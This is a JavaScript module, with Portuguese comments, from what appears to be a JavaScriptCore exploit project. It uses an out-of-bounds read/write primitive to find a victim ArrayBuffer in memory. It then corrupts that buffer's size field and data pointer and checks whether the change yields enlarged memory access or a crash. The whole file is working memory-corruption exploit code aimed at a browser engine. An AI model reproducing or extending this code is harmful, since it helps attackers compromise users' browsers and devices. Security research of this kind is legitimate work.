// js/script3/testCorruptArrayBufferStructure.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// Função para verificar o ArrayBuffer vítima após uma tentativa de corrupção
async function checkVictimABAfterCorruption(victim_ab, originalSize, corruptedField, expectedCorruptedValue, logFn = logS3, FNAME_PARENT = "") {
    logFn(` -> Verificando AB vítima após tentativa de corrupção do campo '${corruptedField}'...`, "info", FNAME_PARENT);
    let accessError = null;
    let currentByteLength = -1;

    try {
        currentByteLength = victim_ab.byteLength;
        logFn(`    victim_ab.byteLength atual: ${toHex(currentByteLength)} (Original: ${toHex(originalSize)})`, "info", FNAME_PARENT);

        if (corruptedField === "size" && currentByteLength === expectedCorruptedValue) {
            logFn(`    ---> SUCESSO NA CORRUPÇÃO DE TAMANHO: victim_ab.byteLength é ${toHex(currentByteLength)} como esperado!`, "vuln", FNAME_PARENT);
            // Tentar uma operação que usaria o novo tamanho
            try {
                const dv = new DataView(victim_ab);
                // Tenta acessar o último byte do suposto novo tamanho
                if (currentByteLength > 0) {
                    dv.getUint8(currentByteLength - 1);
                    logFn(`    ---> DataView conseguiu usar o novo tamanho ${toHex(currentByteLength)} para acesso.`, "critical", FNAME_PARENT);
                    return true; // Corrupção de tamanho bem-sucedida e utilizável
                }
            } catch (e_dv) {
                logFn(`    ---> ERRO ao usar DataView com novo tamanho ${toHex(currentByteLength)}: ${e_dv.message}. POTENCIAL CRASH/UAF!`, "critical", FNAME_PARENT);
                return true; // Consideramos um erro aqui como um "sucesso" na desestabilização
            }
        } else if (corruptedField === "size" && currentByteLength !== originalSize) {
            logFn(`    AVISO: victim_ab.byteLength (${toHex(currentByteLength)}) mudou, mas não para o valor esperado (${toHex(expectedCorruptedValue)}).`, "warn", FNAME_PARENT);
        }

        // Tenta criar um DataView, o que pode falhar se o ponteiro de dados estiver corrompido
        logFn(`    Tentando criar new DataView(victim_ab)...`, "info", FNAME_PARENT);
        new DataView(victim_ab); // Se isso falhar, o catch abaixo pegará
        logFn(`    new DataView(victim_ab) bem-sucedido.`, "info", FNAME_PARENT);

    } catch (e) {
        accessError = e;
        logFn(`    ---> ERRO AO ACESSAR VICTIM_AB APÓS CORRUPÇÃO DE '${corruptedField}': ${e.name} - ${e.message}. POTENCIAL CRASH/UAF!`, "critical", FNAME_PARENT);
        console.error(`Erro ao acessar victim_ab após corrupção de ${corruptedField}:`, e);
        return true; // Sinaliza que um crash/erro de acesso ocorreu
    }
    // Se chegamos aqui sem erro, a corrupção pode não ter tido o efeito de crash desejado no acesso imediato.
    // Se o tamanho foi corrompido para o valor esperado, já retornou true.
    if (corruptedField === "size" && currentByteLength !== originalSize && currentByteLength !== expectedCorruptedValue) {
        logFn(`    Corrupção de tamanho não resultou no valor esperado nem em erro imediato no acesso.`, "warn", FNAME_PARENT);
    } else if (corruptedField === "data_ptr") {
        logFn(`    Corrupção de ponteiro de dados não resultou em erro imediato no acesso.`, "warn", FNAME_PARENT);
    }
    return false;
}


const LONG_PAUSE_S3_AB_CORRUPT = 1000;

export async function testCorruptArrayBufferStructure() {
    const FNAME = "testCorruptArrayBufferStructure_Focused";

    const CORRUPTION_AB_CONFIG = {
        victim_ab_size: 256,
        size_field_offset_in_ab_object: parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16), // Deve ser 0x30
        data_ptr_field_offset_in_ab_object: parseInt(JSC_OFFSETS.ArrayBuffer.DATA_POINTER_OFFSET_FROM_JSARRAYBUFFER_START, 16), // Deve ser 0x20

        corrupted_size_value: 0x7FFFFFFF, // Valor grande para o tamanho
        corrupted_data_ptr_value_NULL: new AdvancedInt64(0, 0), // Ponteiro de dados NULO
        corrupted_data_ptr_value_BAD: new AdvancedInt64(0xBAD0BAD0, 0xBAD0BAD0), // Ponteiro de dados inválido

        // Ajuste estes limites de busca para onde você suspeita que os metadados do seu ArrayBuffer vítima
        // possam estar em relação à sua janela de escrita OOB.
        // Estes são offsets ABSOLUTOS dentro de oob_array_buffer_real.
        search_base_offset_start: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 128, // Começa um pouco antes da DataView OOB
        search_base_offset_end: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) + (OOB_CONFIG.ALLOCATION_SIZE || 32768) - 256, // Termina um pouco antes do fim do buffer OOB
        search_step: 8, // Alinhamento comum
        
        max_crash_detections: 1, // Parar após a primeira detecção de crash/erro significativo
        attempts: 1,
    };

    logS3(`--- Teste Focado de Corrupção de Estrutura de ArrayBuffer (S3) (v2.5) ---`, "test", FNAME);
    logS3(`   Config: victim_size=${CORRUPTION_AB_CONFIG.victim_ab_size}B, SizeFieldOffset=${toHex(CORRUPTION_AB_CONFIG.size_field_offset_in_ab_object)}, DataPtrFieldOffset=${toHex(CORRUPTION_AB_CONFIG.data_ptr_field_offset_in_ab_object)}`, "info", FNAME);
    logS3(`   Procurando por metadados do AB vítima entre ${toHex(CORRUPTION_AB_CONFIG.search_base_offset_start)} e ${toHex(CORRUPTION_AB_CONFIG.search_base_offset_end)} no buffer OOB.`, "info", FNAME);

    let crashDetections = 0;

    for (let attempt = 0; attempt < CORRUPTION_AB_CONFIG.attempts; attempt++) {
        if (crashDetections >= CORRUPTION_AB_CONFIG.max_crash_detections) break;

        logS3(`Tentativa de Corrupção de AB #${attempt + 1}/${CORRUPTION_AB_CONFIG.attempts}...`, "test", FNAME);
        await triggerOOB_primitive(); // Configura oob_array_buffer_real
        if (!oob_array_buffer_real) {
            logS3("Falha ao configurar ambiente OOB. Abortando esta tentativa.", "error", FNAME);
            continue;
        }

        // Criar um ÚNICO ArrayBuffer vítima
        let victim_ab;
        try {
            victim_ab = new ArrayBuffer(CORRUPTION_AB_CONFIG.victim_ab_size);
            logS3(`ArrayBuffer vítima de ${CORRUPTION_AB_CONFIG.victim_ab_size} bytes criado.`, "info", FNAME);
        } catch (e) {
            logS3(`Falha ao criar ArrayBuffer vítima: ${e.message}. Abortando tentativa.`, "error", FNAME);
            clearOOBEnvironment();
            continue;
        }
        const originalVictimSize = CORRUPTION_AB_CONFIG.victim_ab_size;
        await PAUSE_S3(SHORT_PAUSE_S3);


        for (let baseCandidateOffsetForVictimAB = CORRUPTION_AB_CONFIG.search_base_offset_start;
             baseCandidateOffsetForVictimAB < CORRUPTION_AB_CONFIG.search_base_offset_end;
             baseCandidateOffsetForVictimAB += CORRUPTION_AB_CONFIG.search_step) {

            if (crashDetections >= CORRUPTION_AB_CONFIG.max_crash_detections) break;

            // Certificar que o offset base candidato é plausível para um objeto JS (alinhado)
            // e que os campos que vamos corromper estão dentro do buffer OOB.
            if (baseCandidateOffsetForVictimAB < 0 || 
                baseCandidateOffsetForVictimAB + Math.max(CORRUPTION_AB_CONFIG.size_field_offset_in_ab_object + 4, CORRUPTION_AB_CONFIG.data_ptr_field_offset_in_ab_object + 8) > oob_array_buffer_real.byteLength) {
                continue; // Offset fora dos limites seguros do oob_array_buffer_real
            }

            // --- TENTATIVA DE CORROMPER O CAMPO DE TAMANHO ---
            const absOffsetForVictimSizeField = baseCandidateOffsetForVictimAB + CORRUPTION_AB_CONFIG.size_field_offset_in_ab_object;
            let originalValueAtSizeOffset = null;
            
            logS3(` Testando offset base para metadados do AB vítima: ${toHex(baseCandidateOffsetForVictimAB)}`, "subtest", FNAME);
            logS3(`  Tentando corromper TAMANHO em offset abs ${toHex(absOffsetForVictimSizeField)} para ${toHex(CORRUPTION_AB_CONFIG.corrupted_size_value)}`, "info", FNAME);

            try {
                originalValueAtSizeOffset = oob_read_absolute(absOffsetForVictimSizeField, 4);
                logS3(`   Valor original (tamanho): ${toHex(originalValueAtSizeOffset)}`, "info", FNAME);
                oob_write_absolute(absOffsetForVictimSizeField, CORRUPTION_AB_CONFIG.corrupted_size_value, 4);

                if (await checkVictimABAfterCorruption(victim_ab, originalVictimSize, "size", CORRUPTION_AB_CONFIG.corrupted_size_value, logS3, FNAME)) {
                    crashDetections++;
                    logS3(`    !!! DETECÇÃO DE CRASH/ERRO APÓS CORRUPÇÃO DE TAMANHO NO OFFSET BASE ${toHex(baseCandidateOffsetForVictimAB)} !!!`, "critical", FNAME);
                    if (crashDetections >= CORRUPTION_AB_CONFIG.max_crash_detections) break;
                }
            } catch (e_write_size) {
                logS3(`   Falha na leitura/escrita OOB para o campo de tamanho em ${toHex(absOffsetForVictimSizeField)}: ${e_write_size.message}`, "warn", FNAME);
            } finally {
                if (originalValueAtSizeOffset !== null) { // Tenta restaurar se foi lido
                    try { oob_write_absolute(absOffsetForVictimSizeField, originalValueAtSizeOffset, 4); } catch (e_restore) { /* silencioso */ }
                }
            }
            if (crashDetections >= CORRUPTION_AB_CONFIG.max_crash_detections) break;
            await PAUSE_S3(SHORT_PAUSE_S3 / 2);


            // --- TENTATIVA DE CORROMPER O PONTEIRO DE DADOS ---
            const absOffsetForVictimDataPtrField = baseCandidateOffsetForVictimAB + CORRUPTION_AB_CONFIG.data_ptr_field_offset_in_ab_object;
            let originalValueAtDataPtrOffset = null;
            const dataPtrValuesToTry = [
                CORRUPTION_AB_CONFIG.corrupted_data_ptr_value_NULL,
                CORRUPTION_AB_CONFIG.corrupted_data_ptr_value_BAD
            ];

            for (const corruptedDataPtr of dataPtrValuesToTry) {
                if (crashDetections >= CORRUPTION_AB_CONFIG.max_crash_detections) break;
                logS3(`  Tentando corromper DATA_PTR em offset abs ${toHex(absOffsetForVictimDataPtrField)} para ${corruptedDataPtr.toString(true)}`, "info", FNAME);
                try {
                    originalValueAtDataPtrOffset = oob_read_absolute(absOffsetForVictimDataPtrField, 8); // Ponteiro é 8 bytes
                    logS3(`   Valor original (data_ptr): ${isAdvancedInt64Object(originalValueAtDataPtrOffset) ? originalValueAtDataPtrOffset.toString(true) : toHex(originalValueAtDataPtrOffset)}`, "info", FNAME);
                    oob_write_absolute(absOffsetForVictimDataPtrField, corruptedDataPtr, 8);

                    if (await checkVictimABAfterCorruption(victim_ab, originalVictimSize, "data_ptr", -1, logS3, FNAME)) { // -1 como expectedCorruptedValue pois não estamos checando valor
                        crashDetections++;
                        logS3(`    !!! DETECÇÃO DE CRASH/ERRO APÓS CORRUPÇÃO DE DATA_PTR NO OFFSET BASE ${toHex(baseCandidateOffsetForVictimAB)} !!!`, "critical", FNAME);
                        if (crashDetections >= CORRUPTION_AB_CONFIG.max_crash_detections) break;
                    }
                } catch (e_write_ptr) {
                    logS3(`   Falha na leitura/escrita OOB para o campo data_ptr em ${toHex(absOffsetForVictimDataPtrField)}: ${e_write_ptr.message}`, "warn", FNAME);
                } finally {
                    if (originalValueAtDataPtrOffset !== null) { // Tenta restaurar se foi lido
                        try { oob_write_absolute(absOffsetForVictimDataPtrField, originalValueAtDataPtrOffset, 8); } catch (e_restore) { /* silencioso */ }
                    }
                }
                if (crashDetections >= CORRUPTION_AB_CONFIG.max_crash_detections) break;
                await PAUSE_S3(SHORT_PAUSE_S3 / 2);
            }
            if (crashDetections >= CORRUPTION_AB_CONFIG.max_crash_detections) break;

            // Pausa entre as tentativas de diferentes offsets base para não sobrecarregar
            if (baseCandidateOffsetForVictimAB % (CORRUPTION_AB_CONFIG.search_step * 20) === 0) {
                 await PAUSE_S3(MEDIUM_PAUSE_S3);
            }
        } // Fim do loop de baseCandidateOffsetForVictimAB

        clearOOBEnvironment();
        victim_ab = null; // Ajudar GC
        if (crashDetections >= CORRUPTION_AB_CONFIG.max_crash_detections) break;
        logS3(`Fim da Tentativa #${attempt + 1}. Pausando antes da próxima se houver...`);
        if (attempt + 1 < CORRUPTION_AB_CONFIG.attempts) await PAUSE_S3(LONG_PAUSE_S3_AB_CORRUPT);
    }

    logS3(`--- Teste Focado de Corrupção de Estrutura de ArrayBuffer Concluído (Detecções de Crash/Erro Significativo: ${crashDetections}) ---`, "test", FNAME);
}
